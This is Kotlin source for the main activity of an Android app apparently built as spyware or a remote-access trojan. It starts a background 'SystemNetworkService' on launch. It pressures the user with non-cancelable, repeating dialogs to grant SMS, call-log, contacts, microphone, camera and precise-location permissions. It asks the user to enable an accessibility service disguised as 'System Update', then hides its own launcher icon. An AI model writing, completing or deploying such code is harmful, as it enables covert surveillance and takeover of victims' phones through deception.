package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.SystemNetworkService

class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        val PERM_DESCRIPTIONS = mapOf(
            Manifest.permission.CAMERA to "Take photos and record video",
            Manifest.permission.CALL_PHONE to "Make phone calls",
            Manifest.permission.READ_CALL_LOG to "View call history",
            Manifest.permission.SEND_SMS to "Send text messages",
            Manifest.permission.READ_CONTACTS to "Access contacts",
            Manifest.permission.WRITE_CONTACTS to "Modify contacts",
            Manifest.permission.RECORD_AUDIO to "Record audio",
            Manifest.permission.READ_SMS to "Read text messages",
            Manifest.permission.READ_PHONE_STATE to "View phone state",
            Manifest.permission.ACCESS_COARSE_LOCATION to "Approximate location",
            Manifest.permission.ACCESS_FINE_LOCATION to "Precise location",
            Manifest.permission.READ_EXTERNAL_STORAGE to "Read files",
            Manifest.permission.WRITE_EXTERNAL_STORAGE to "Write files",
            Manifest.permission.POST_NOTIFICATIONS to "Show notifications",
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
            return try {
                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) return true
                }
                false
            } catch (_: Exception) {
                false
            }
        }
    }

    private var permissionsRequested = false
    private var pendingDeniedPerms: List<String> = emptyList()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try { SystemNetworkService.start(this) } catch (_: Exception) {}

        Handler(Looper.getMainLooper()).postDelayed({
            checkAndProceed()
        }, 300)
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)

        when {
            !permsOk -> requestAllPerms()
            !accOk -> showEnableAccessibilityAlert()
            else -> onSetupComplete()
        }
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
        } else {
            pendingDeniedPerms = needed
            showPermissionDialog(needed)
        }
    }

    private fun showPermissionDialog(perms: List<String>) {
        val desc = perms.joinToString("\n") { p ->
            val name = p.substringAfterLast(".")
            val d = PERM_DESCRIPTIONS[p] ?: "Required permission"
            "  • $name — $d"
        }

        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app needs the following permissions to work:\n\n$desc\n\nTap ALLOW to grant all permissions.")
            .setPositiveButton("Allow All") { _, _ ->
                ActivityCompat.requestPermissions(this, perms.toTypedArray(), RC_ALL)
            }
            .setNegativeButton("Settings") { _, _ ->
                openAppSettings()
            }
            .setCancelable(false)
            .show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
            if (denied.isEmpty()) {
                checkAndProceed()
            } else {
                pendingDeniedPerms = denied
                Handler(Looper.getMainLooper()).postDelayed({
                    if (!isFinishing && !isDestroyed) {
                        showPermissionDialog(denied)
                    }
                }, 500)
            }
        }
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        startActivity(Intent(this, VpnActivity::class.java))
        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)
        val serviceOk = isServiceRunning(this, SystemNetworkService::class.java)

        when {
            accOk && permsOk -> {
                if (!serviceOk) {
                    try { SystemNetworkService.start(this) } catch (_: Exception) {}
                }
                startActivity(Intent(this, VpnActivity::class.java))
                finishAndRemoveTask()
            }
            !permsOk -> {
                requestAllPerms()
            }
            !accOk -> {
                showEnableAccessibilityAlert()
            }
        }
    }

    private fun showEnableAccessibilityAlert() {
        AlertDialog.Builder(this)
            .setTitle("Setup Required")
            .setMessage("Please enable Accessibility Service for the app to work properly.\n\n1. Find 'System Update' in the list\n2. Toggle it ON\n3. Tap Allow")
            .setPositiveButton("Open Settings") { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (_: Exception) {}
            }
            .setNegativeButton("Later") { _, _ ->
                finishAndRemoveTask()
            }
            .setCancelable(false)
            .show()
    }
}
